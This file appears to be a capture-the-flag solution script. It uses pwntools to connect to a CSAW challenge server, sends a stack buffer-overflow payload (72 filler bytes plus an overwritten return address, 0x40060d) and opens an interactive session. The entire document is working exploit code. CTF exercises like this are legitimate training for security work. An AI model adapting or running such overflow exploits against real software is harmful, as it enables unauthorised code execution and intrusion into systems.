from pwn import *

p=remote('pwn.chal.csaw.io',8000)

payload='A'*8*9+p64(0x40060d)

p.recvuntil('>')
p.sendline(payload)
print p.recvall()
p.interactive()
